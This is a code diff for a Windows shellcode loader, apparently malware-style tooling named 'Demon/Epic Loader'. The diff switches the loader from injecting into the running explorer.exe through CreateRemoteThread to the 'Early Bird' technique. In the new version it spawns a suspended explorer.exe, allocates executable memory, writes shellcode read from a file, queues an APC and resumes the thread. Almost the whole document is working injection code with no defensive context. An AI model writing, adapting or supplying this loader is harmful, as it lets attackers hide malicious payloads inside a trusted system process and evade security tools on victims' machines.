@@ -4,34 +4,9 @@
 
 void DisplayBanner() {
     printf("\n");
-    printf("-----DEMON LOADER-----\n");
-    printf("BY CHRIS H");
+    printf("-----EPIC LOADER INJECTION-----\n");
+    printf("BY CHRIS H\n");
     printf("\n");
-}
-
-
-// Function to find the PID of explorer.exe
-DWORD FindExplorerPID() {
-    DWORD explorerPID = 0;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("[ERROR] Failed to create process snapshot.\n");
-        return 0;
-    }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
-                explorerPID = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return explorerPID;
 }
 
 // Function to read shellcode from a file
@@ -76,29 +51,25 @@ int main(int argc, char* argv[]) {
 
     printf("[DEBUG] Shellcode read successfully (%zu bytes).\n", shellcodeSize);
 
-    // Find the PID of explorer.exe
-    DWORD explorerPID = FindExplorerPID();
-    if (explorerPID == 0) {
-        printf("[ERROR] Failed to find explorer.exe process.\n");
+    // Create a new suspended explorer.exe process
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi;
+
+    if (!CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[ERROR] Failed to create a new explorer.exe process: %d\n", GetLastError());
         free(shellcode);
         return 1;
     }
 
-    printf("[DEBUG] explorer.exe PID: %d\n", explorerPID);
-
-    // Open the target process (explorer.exe)
-    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
-    if (!hTargetProcess) {
-        printf("[ERROR] OpenProcess failed: %d\n", GetLastError());
-        free(shellcode);
-        return 1;
-    }
+    printf("[DEBUG] Suspended explorer.exe process created. PID: %d\n", pi.dwProcessId);
 
     // Allocate memory for the shellcode in the target process
-    LPVOID remoteShellcode = VirtualAllocEx(hTargetProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteShellcode) {
         printf("[ERROR] VirtualAllocEx failed: %d\n", GetLastError());
-        CloseHandle(hTargetProcess);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         free(shellcode);
         return 1;
     }
@@ -106,39 +77,39 @@ int main(int argc, char* argv[]) {
     printf("[DEBUG] Allocated memory in target process.\n");
 
     // Write the shellcode to the allocated memory
-    if (!WriteProcessMemory(hTargetProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
+    if (!WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
         printf("[ERROR] WriteProcessMemory failed: %d\n", GetLastError());
-        VirtualFreeEx(hTargetProcess, remoteShellcode, 0, MEM_RELEASE);
-        CloseHandle(hTargetProcess);
+        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         free(shellcode);
         return 1;
     }
 
     printf("[DEBUG] Shellcode written to allocated memory.\n");
 
-    // Create a suspended thread in the target process
-    HANDLE hThread = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, NULL, CREATE_SUSPENDED, NULL);
-    if (!hThread) {
-        printf("[ERROR] CreateRemoteThread failed: %d\n", GetLastError());
-        VirtualFreeEx(hTargetProcess, remoteShellcode, 0, MEM_RELEASE);
-        CloseHandle(hTargetProcess);
+    // Queue an APC to the main thread of the process
+    if (!QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, NULL)) {
+        printf("[ERROR] QueueUserAPC failed: %d\n", GetLastError());
+        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         free(shellcode);
         return 1;
     }
 
-    printf("[DEBUG] Suspended thread created in target process.\n");
+    printf("[DEBUG] APC queued successfully. Resuming thread to trigger the shellcode.\n");
 
     // Resume the thread to execute the shellcode
-    ResumeThread(hThread);
-    printf("[DEBUG] Resumed the thread. Shellcode execution started.\n");
+    ResumeThread(pi.hThread);
 
     // Clean up
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    VirtualFreeEx(hTargetProcess, remoteShellcode, 0, MEM_RELEASE);
-    CloseHandle(hTargetProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     free(shellcode);
 
-    printf("[INFO] EarlyBird injection completed successfully.\n");
+    printf("[INFO] Early Bird injection completed successfully.\n");
     return 0;
 }
